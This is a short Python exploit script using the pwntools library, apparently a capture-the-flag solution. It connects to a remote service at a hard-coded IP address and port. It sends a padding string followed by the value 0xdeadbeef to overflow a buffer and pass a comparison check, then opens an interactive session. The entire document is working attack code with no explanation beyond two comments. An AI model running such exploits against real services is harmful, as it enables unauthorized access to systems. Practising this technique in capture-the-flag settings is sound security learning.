#!/usr/bin/env python

from pwn import *

p = remote('68.183.158.95', 8989)
payload = ''
payload+= 'A'*10 # Fill the buffer
payload+= '\xef\xbe\xad\xde' # match the CMP instruction
p.sendline(payload)
p.interactive()